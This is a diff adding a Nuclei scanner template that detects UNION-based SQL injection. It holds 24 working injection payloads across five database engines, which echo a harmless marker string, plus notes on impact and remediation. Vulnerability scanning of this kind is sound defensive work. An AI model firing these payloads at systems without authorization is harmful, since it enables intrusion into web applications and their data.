@@ -1,0 +1,89 @@
+id: sqli-union-based
+
+info:
+  name: UNION-Based SQL Injection
+  author: n0x
+  severity: high
+  description: |
+    Injects UNION SELECT expressions whose output is the string "nucleiz",
+    assembled from database character functions rather than a literal. Because
+    the marker is not present in the request payload, a match is more likely to
+    be query output than simple input reflection.
+
+    Payloads cover MySQL, PostgreSQL, Microsoft SQL Server, Oracle, and SQLite
+    with one through five columns. Run with -dast (or -fuzz on older Nuclei
+    versions) and only against authorized targets.
+  impact: |
+    A UNION-based injection can let an attacker read arbitrary tables and
+    columns, including credentials, tokens, and personal data.
+  remediation: |
+    Use parameterized queries / prepared statements, avoid string
+    concatenation, and apply least-privilege database accounts.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://portswigger.net/web-security/sql-injection/union-attacks
+  classification:
+    cwe-id: CWE-89
+  metadata:
+    max-request: 30
+  tags: sqli,sqli-union,dast,web
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET" || method == "POST"'
+
+    payloads:
+      sqli:
+        # MySQL / MariaDB
+        - "' UNION SELECT CHAR(110,117,99,108,101,105,122)-- -"
+        - "' UNION SELECT NULL,CHAR(110,117,99,108,101,105,122)-- -"
+        - "' UNION SELECT NULL,NULL,CHAR(110,117,99,108,101,105,122)-- -"
+        - "' UNION SELECT NULL,NULL,NULL,CHAR(110,117,99,108,101,105,122)-- -"
+        - "' UNION SELECT NULL,NULL,NULL,NULL,CHAR(110,117,99,108,101,105,122)-- -"
+        # PostgreSQL
+        - "' UNION SELECT CHR(110)||CHR(117)||CHR(99)||CHR(108)||CHR(101)||CHR(105)||CHR(122)-- -"
+        - "' UNION SELECT NULL,CHR(110)||CHR(117)||CHR(99)||CHR(108)||CHR(101)||CHR(105)||CHR(122)-- -"
+        - "' UNION SELECT NULL,NULL,CHR(110)||CHR(117)||CHR(99)||CHR(108)||CHR(101)||CHR(105)||CHR(122)-- -"
+        - "' UNION SELECT NULL,NULL,NULL,CHR(110)||CHR(117)||CHR(99)||CHR(108)||CHR(101)||CHR(105)||CHR(122)-- -"
+        - "' UNION SELECT NULL,NULL,NULL,NULL,CHR(110)||CHR(117)||CHR(99)||CHR(108)||CHR(101)||CHR(105)||CHR(122)-- -"
+        # Microsoft SQL Server
+        - "' UNION SELECT CHAR(110)+CHAR(117)+CHAR(99)+CHAR(108)+CHAR(101)+CHAR(105)+CHAR(122)-- -"
+        - "' UNION SELECT NULL,CHAR(110)+CHAR(117)+CHAR(99)+CHAR(108)+CHAR(101)+CHAR(105)+CHAR(122)-- -"
+        - "' UNION SELECT NULL,NULL,CHAR(110)+CHAR(117)+CHAR(99)+CHAR(108)+CHAR(101)+CHAR(105)+CHAR(122)-- -"
+        - "' UNION SELECT NULL,NULL,NULL,CHAR(110)+CHAR(117)+CHAR(99)+CHAR(108)+CHAR(101)+CHAR(105)+CHAR(122)-- -"
+        - "' UNION SELECT NULL,NULL,NULL,NULL,CHAR(110)+CHAR(117)+CHAR(99)+CHAR(108)+CHAR(101)+CHAR(105)+CHAR(122)-- -"
+        # Oracle
+        - "' UNION SELECT CHR(110)||CHR(117)||CHR(99)||CHR(108)||CHR(101)||CHR(105)||CHR(122) FROM DUAL-- -"
+        - "' UNION SELECT NULL,CHR(110)||CHR(117)||CHR(99)||CHR(108)||CHR(101)||CHR(105)||CHR(122) FROM DUAL-- -"
+        - "' UNION SELECT NULL,NULL,CHR(110)||CHR(117)||CHR(99)||CHR(108)||CHR(101)||CHR(105)||CHR(122) FROM DUAL-- -"
+        - "' UNION SELECT NULL,NULL,NULL,CHR(110)||CHR(117)||CHR(99)||CHR(108)||CHR(101)||CHR(105)||CHR(122) FROM DUAL-- -"
+        # SQLite
+        - "' UNION SELECT CHAR(110)||CHAR(117)||CHAR(99)||CHAR(108)||CHAR(101)||CHAR(105)||CHAR(122)-- -"
+        - "' UNION SELECT NULL,CHAR(110)||CHAR(117)||CHAR(99)||CHAR(108)||CHAR(101)||CHAR(105)||CHAR(122)-- -"
+        - "' UNION SELECT NULL,NULL,CHAR(110)||CHAR(117)||CHAR(99)||CHAR(108)||CHAR(101)||CHAR(105)||CHAR(122)-- -"
+        - "' UNION SELECT NULL,NULL,NULL,CHAR(110)||CHAR(117)||CHAR(99)||CHAR(108)||CHAR(101)||CHAR(105)||CHAR(122)-- -"
+        - "' UNION SELECT NULL,NULL,NULL,NULL,CHAR(110)||CHAR(117)||CHAR(99)||CHAR(108)||CHAR(101)||CHAR(105)||CHAR(122)-- -"
+
+    attack: batteringram
+    fuzzing:
+      - parts:
+          - query
+          - body
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "nucleiz"
+
+      - type: dsl
+        dsl:
+          - "status_code == 200"
